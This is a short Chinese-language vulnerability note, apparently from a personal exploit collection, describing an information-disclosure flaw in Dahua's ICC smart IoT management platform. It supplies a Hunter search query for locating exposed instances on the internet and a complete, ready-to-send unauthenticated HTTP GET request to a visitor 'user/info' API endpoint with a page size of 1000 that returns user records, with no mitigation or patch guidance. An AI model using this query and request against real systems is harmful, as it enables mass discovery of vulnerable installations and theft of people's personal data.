# 大华智能物联综合管理平台(ICC)info存在信息泄露

# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台(ICC)info存在信息泄露。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征

![1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004.png](./img/8KAhtAW0SvGpY8Rt/1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004-364557.png)

# 四、漏洞复现
```plain
GET /evo-apigw/evo-visitor/1.0.0/card/visitor/user/info?userId=4&pageNum=1&pageSize=1000 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```

![1716001623502-df87343a-998c-4522-b992-0490c28a22c5.png](./img/8KAhtAW0SvGpY8Rt/1716001623502-df87343a-998c-4522-b992-0490c28a22c5-537803.png)



> 更新: 2024-05-18 12:31:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qiwf6qcxedf9t1ir>